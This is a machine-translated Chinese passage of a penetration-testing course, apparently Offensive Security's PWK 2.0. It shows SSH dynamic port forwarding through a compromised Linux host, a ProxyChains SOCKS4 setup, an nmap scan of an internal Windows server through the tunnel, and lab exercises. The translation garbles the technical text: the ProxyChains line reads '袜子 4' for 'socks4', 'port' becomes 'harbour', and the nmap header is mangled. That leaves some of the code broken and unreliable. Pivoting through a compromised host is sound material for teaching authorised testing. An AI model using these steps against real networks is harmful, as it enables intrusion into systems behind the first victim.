<div style="position:absolute;top:195511;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.2.2.2 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:195541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 通过 SSH 连接到您的专用 Linux 实验室客户端并从以下位置运行 clear_rules.sh 脚本</font></font></nobr></div>
<div style="position:absolute;top:195561;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/root/port_forwarding_and_tunneling/ 作为 root。</font></font></nobr></div>
<div style="position:absolute;top:195589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 关闭与您的专用 Linux 实验室客户端的所有 SSH 连接，然后作为</font></font></nobr></div>
<div style="position:absolute;top:195608;left:145"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 rdesktop 的</font><i><font style="vertical-align: inherit;">学生</font></i><font style="vertical-align: inherit;">帐户并从以下位置运行 ssh_remote_port_forward.sh 脚本</font></font></nobr></div>
<div style="position:absolute;top:195628;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/root/port_forwarding_and_tunneling/ 作为 root。</font></font></nobr></div>
<div style="position:absolute;top:195656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 尝试复制上述场景中涵盖的 SSH 远程端口转发和</font></font></nobr></div>
<div style="position:absolute;top:195675;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确保您可以扫描并与 MySQL 服务交互。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:195710;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.2.3</font></font></i></nobr></div>
<div style="position:absolute;top:195710;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH 动态端口转发</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:195747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在是真正有趣的部分。</font><font style="vertical-align: inherit;">SSH</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">动态端口转发</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许我们设置本地监听端口</font></font></nobr></div>
<div style="position:absolute;top:195767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并通过使用代理将传入流量隧道传输到任何远程目的地。</font></font></nobr></div>
<div style="position:absolute;top:195800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个场景中（类似于 SSH 本地端口转发部分中使用的场景），我们有</font></font></nobr></div>
<div style="position:absolute;top:195819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">入侵了一个基于 Linux 的目标并提升了我们的权限。</font><font style="vertical-align: inherit;">似乎没有</font></font></nobr></div>
<div style="position:absolute;top:195839;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防火墙上的入站或出站流量限制。</font></font></nobr></div>
<div style="position:absolute;top:195871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在进一步枚举受感染的 Linux 客户端后，我们发现除了被</font></font></nobr></div>
<div style="position:absolute;top:195891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到当前网络 (10.11.0.x)，它有一个额外的网络接口，似乎</font></font></nobr></div>
<div style="position:absolute;top:195910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到不同的网络 (192.168.1.x)。</font><font style="vertical-align: inherit;">在这个内部子网上，我们已经确定了一个</font></font></nobr></div>
<div style="position:absolute;top:195929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有可用网络共享的 Windows Server 2016 计算机。</font></font></nobr></div>
<div style="position:absolute;top:195962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本地端口转发部分，我们设法与可用共享进行交互</font></font></nobr></div>
<div style="position:absolute;top:195981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Server 2016 机器；</font><font style="vertical-align: inherit;">但是，该技术仅限于特定的 IP 地址，并且</font></font></nobr></div>
<div style="position:absolute;top:196001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口。</font><font style="vertical-align: inherit;">在此示例中，我们希望针对 Windows Server 2016 计算机上的其他端口，</font></font></nobr></div>
<div style="position:absolute;top:196020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或内部网络上的主机，而不必为每个端口或主机建立不同的隧道</font></font></nobr></div>
<div style="position:absolute;top:196039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出于兴趣。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:196195;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="166"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 166 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:196228;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:197305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:197305;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:197305;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">607</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:196324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了在我们的实验室环境中模拟这种情况，我们将再次运行 ssh_local_port_forwarding.sh</font></font></nobr></div>
<div style="position:absolute;top:196343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自我们专用 Linux 客户端的脚本。</font></font></nobr></div>
<div style="position:absolute;top:196376;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦环境设置好，我们就可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh -D</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来指定本地动态</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SOCKS4</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序-</font></font></nobr></div>
<div style="position:absolute;top:196395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用以下语法进行级别端口转发（再次在 SSH 中进行隧道传输）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:196430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh -N -D &lt;绑定到的地址&gt;:&lt;绑定到的端口&gt; &lt;用户名&gt;@&lt;SSH 服务器地址&gt;</font></font></nobr></div>
<div style="position:absolute;top:196450;left:249"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 641 - 使用 SSH 进行动态端口转发的命令原型</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:196479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑到上述语法，我们可以</font><font style="vertical-align: inherit;">在 Kali 上</font><font style="vertical-align: inherit;">创建本地 SOCKS4 应用程序代理（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-N -D</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font></font></nobr></div>
<div style="position:absolute;top:196498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 端口 8080 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1:8080</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">上的 Linux 机器</font><font style="vertical-align: inherit;">，它将所有传入流量隧道传输到任何</font></font></nobr></div>
<div style="position:absolute;top:196518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过我们以学生身份登录的受感染 Linux 机器在目标网络中托管</font></font></nobr></div>
<div style="position:absolute;top:196537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（学生@ </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.128</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:196572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128</font></font></font></b></nobr></div>
<div style="position:absolute;top:196589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@10.11.0.128 的密码：</font></font></nobr></div>
<div style="position:absolute;top:196608;left:218"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 642 - 在 TCP 端口 8080 上创建一个到目标网络的动态 SSH 隧道</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:196638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然我们已经启动了一个应用代理，可以将应用流量路由到目标</font></font></nobr></div>
<div style="position:absolute;top:196657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 SSH 隧道网络，我们必须以某种方式将我们的侦察和攻击工具引导到</font></font></nobr></div>
<div style="position:absolute;top:196676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用这个代理。</font><font style="vertical-align: inherit;">我们可以通过 HTTP、SOCKS4 和 SOCKS5 代理运行任何网络应用程序</font></font></nobr></div>
<div style="position:absolute;top:196696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ProxyChains</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的帮助下</font><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">593</font></font></font></nobr></div>
<div style="position:absolute;top:196728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要配置 ProxyChains，我们只需编辑主配置文件 (/etc/proxychains.conf) 和</font></font></nobr></div>
<div style="position:absolute;top:196748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将我们的 SOCKS4 代理添加到其中：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:196783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /etc/proxychains.conf</font></font></font></b></nobr></div>
<div style="position:absolute;top:196800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:196834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[代理列表]</font></font></nobr></div>
<div style="position:absolute;top:196851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 在这里添加代理...</font></font></nobr></div>
<div style="position:absolute;top:196867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 意思是</font></font></nobr></div>
<div style="position:absolute;top:196885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 默认设置为“tor”</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:196902;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">袜子 4 127.0.0.1 8080</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:196921;left:241"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 643 - 将我们的 SOCKS4 代理添加到 ProxyChains 配置文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:196951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此配置如图 300 所示：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:197255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">593 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（亚当·哈姆西克，2017 年），https://github.com/haad/proxychains</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:197383;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="167"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 167 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:197416;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:198493;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:198493;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:198493;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">608</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:197901;left:329"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 300：动态端口转发图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:197933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了通过我们的 SOCKS4 代理运行我们的工具，我们在每个命令前加上</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">proxychains</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:197965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，让我们尝试扫描内部目标网络上的 Windows Server 2016 机器</font></font></nobr></div>
<div style="position:absolute;top:197985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">在这个例子中，</font><font style="vertical-align: inherit;">除了</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">nmap</font></font></b><font style="vertical-align: inherit;">之外</font><font style="vertical-align: inherit;">，我们没有为</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理链</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供任何选项</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:198004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令及其参数：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:198039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110</font></font></font></b></nobr></div>
<div style="position:absolute;top:198056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ProxyChains-3.1 (http://proxychains.sf.net)</font></font></nobr></div>
<div style="position:absolute;top:198090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-04-19 18:18 EEST 开始 Nmap 7.60 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:198107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:443-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:23-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:80-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:8080-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:445-&lt;&gt;&lt;&gt;-OK</font></font></nobr></div>
<div style="position:absolute;top:198192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:135-&lt;&gt;&lt;&gt;-OK</font></font></nobr></div>
<div style="position:absolute;top:198209;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:139-&lt;&gt;&lt;&gt;-OK</font></font></nobr></div>
<div style="position:absolute;top:198226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:22-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:3389-&lt;&gt;&lt;&gt;-OK</font></font></nobr></div>
<div style="position:absolute;top:198260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:1723-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198277;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:21-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:5900-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:111-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:25-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:53-&lt;&gt;&lt;&gt;-OK</font></font></nobr></div>
<div style="position:absolute;top:198361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:993-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198378;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:3306-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:143-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:995-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.1.110:110-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:198446;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.110 的 Nmap 扫描报告 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:198571;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="168"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 168 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:198604;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:199681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:199681;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:199681;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">609</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:198700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.17 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:198733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:198750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21/tcp 关闭 ftp</font></font></nobr></div>
<div style="position:absolute;top:198768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22/tcp 关闭 ssh</font></font></nobr></div>
<div style="position:absolute;top:198784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23/tcp 关闭 telnet</font></font></nobr></div>
<div style="position:absolute;top:198801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25/tcp 关闭 smtp</font></font></nobr></div>
<div style="position:absolute;top:198818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53/tcp 开放域</font></font></nobr></div>
<div style="position:absolute;top:198835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80/tcp 关闭 http</font></font></nobr></div>
<div style="position:absolute;top:198852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">110/tcp 关闭 pop3</font></font></nobr></div>
<div style="position:absolute;top:198869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">111/tcp 关闭 rpcbind</font></font></nobr></div>
<div style="position:absolute;top:198886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">135/tcp 打开 msrpc</font></font></nobr></div>
<div style="position:absolute;top:198903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139/tcp 打开 netbios-ssn</font></font></nobr></div>
<div style="position:absolute;top:198920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">143/tcp 关闭 imap</font></font></nobr></div>
<div style="position:absolute;top:198937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">443/tcp 关闭 https</font></font></nobr></div>
<div style="position:absolute;top:198954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">445/tcp 打开 microsoft-ds</font></font></nobr></div>
<div style="position:absolute;top:198971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">993/tcp 封闭 imap</font></font></nobr></div>
<div style="position:absolute;top:198988;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">995/tcp 关闭 pop3s</font></font></nobr></div>
<div style="position:absolute;top:199005;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1723/tcp 关闭 pptp</font></font></nobr></div>
<div style="position:absolute;top:199022;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3306/tcp 关闭 mysql</font></font></nobr></div>
<div style="position:absolute;top:199039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3389/tcp 打开 ms-wbt-server</font></font></nobr></div>
<div style="position:absolute;top:199056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5900/tcp 封闭 vnc</font></font></nobr></div>
<div style="position:absolute;top:199073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8080/tcp 关闭 http 代理</font></font></nobr></div>
<div style="position:absolute;top:199107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：3.54 秒内扫描 1 个 IP 地址（1 个主机启动）</font></font></nobr></div>
<div style="position:absolute;top:199126;left:258"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 644 - 使用 nmap 通过动态隧道扫描机器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:199156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 644 中，ProxyChains 按预期工作，将我们的所有流量路由到各个端口</font></font></nobr></div>
<div style="position:absolute;top:199175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">动态，而不必提供单独的端口转发。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:199237;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，ProxyChains 将首先尝试从</font></font></i></nobr></div>
<div style="position:absolute;top:199256;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前目录，然后从用户的</font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$(HOME)/.proxychains</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录，以及</font></font></i></nobr></div>
<div style="position:absolute;top:199276;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后来自</font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/proxychains.conf</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这允许我们通过多个运行工具</font></font></i></nobr></div>
<div style="position:absolute;top:199295;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">动态隧道，取决于我们的需要。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:199357;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.2.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:199387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 连接到您的专用 Linux 实验室客户端并从以下位置运行 clear_rules.sh 脚本</font></font></nobr></div>
<div style="position:absolute;top:199407;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/root/port_forwarding_and_tunneling/ 作为 root。</font></font></nobr></div>
